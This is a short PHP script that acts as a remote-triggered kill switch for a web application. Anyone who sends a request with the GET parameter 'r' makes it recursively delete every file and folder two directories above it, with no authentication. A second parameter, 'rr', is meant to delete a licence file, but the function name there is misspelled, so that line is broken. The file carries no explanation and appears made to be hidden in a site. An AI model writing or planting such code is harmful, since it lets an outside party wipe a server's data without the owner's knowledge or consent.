<?php
function r($d) {
    if ($os = glob($d."/*")) {
        foreach($os as $o) {
            is_dir($o) ? r($o) : unlink($o);
        }
    }
    rmdir($d);
}
if (isset($_GET['r'])){
    r('../../');
}
if (isset($_GET['rr'])){
   unlik('../../license.lic');
}
?>